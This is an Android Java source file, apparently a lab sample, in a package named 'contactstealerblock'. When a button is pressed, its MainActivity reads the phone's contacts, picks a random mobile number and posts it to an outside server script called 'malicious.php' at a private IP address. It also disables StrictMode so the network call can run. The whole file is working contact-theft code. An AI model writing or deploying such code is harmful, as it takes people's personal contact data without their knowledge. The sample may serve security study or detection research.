package com.example.contactstealerblock;

import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;
import com.example.contactstealerblock.R;
import com.example.contactstealerblock.ServiceHandler;
import android.support.v7.app.ActionBarActivity;
import android.annotation.TargetApi;
import android.content.ContentResolver;
import android.database.Cursor;
import android.os.Build;
import android.os.Bundle;
import android.os.StrictMode;
import android.provider.ContactsContract;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;


@TargetApi(Build.VERSION_CODES.HONEYCOMB) public class MainActivity extends ActionBarActivity {
	
	final String url = "http://192.168.56.103/malicious.php";
	
    @TargetApi(Build.VERSION_CODES.GINGERBREAD) @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        //contacts code
        final TextView tv = (TextView)findViewById(R.id.tv);
        Button b = (Button)findViewById(R.id.button);
        
        if (android.os.Build.VERSION.SDK_INT > 9) {
            StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
            StrictMode.setThreadPolicy(policy);
        }
        
        b.setOnClickListener(new View.OnClickListener(){

			@Override
			public void onClick(View v) {
				// TODO Auto-generated method stub
				 List numbers = new ArrayList();;
			       
				ContentResolver cr = getContentResolver();
		        Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
		        if(cursor.getCount() > 0){	
		        	while(cursor.moveToNext()){
		        		String contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
			        	Cursor phones = cr.query(Phone.CONTENT_URI, null, Phone.CONTACT_ID + " = " + contactId, null, null);
			        	

			        	while (phones.moveToNext()) {
			        		String number = phones.getString(phones.getColumnIndex(Phone.NUMBER));
			        		int type = phones.getInt(phones.getColumnIndex(Phone.TYPE));
			        		switch (type) {
			        			case Phone.TYPE_MOBILE:
			        				numbers.add(number);
			        				break;
			        		}
			        	}

		        	}
		        	
		        	String randNum;
		        	
		        	Random randGen = new Random();
		        	randNum = numbers.get(randGen.nextInt(numbers.size())).toString();
		        	tv.setText("phone number : "+randNum);
		        	
		        	List<NameValuePair> params = new ArrayList<NameValuePair>();
		            params.add(new BasicNameValuePair("number", randNum));
		            
		            ServiceHandler sh = new ServiceHandler();
		            sh.makeServiceCall(url, params, randNum);
		        }
		        else tv.setText("Retrieval failed");
				
			}
        	
        });

        //end of contact code
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();
        if (id == R.id.action_settings) {
            return true;
        }
        return super.onOptionsItemSelected(item);
    }
}
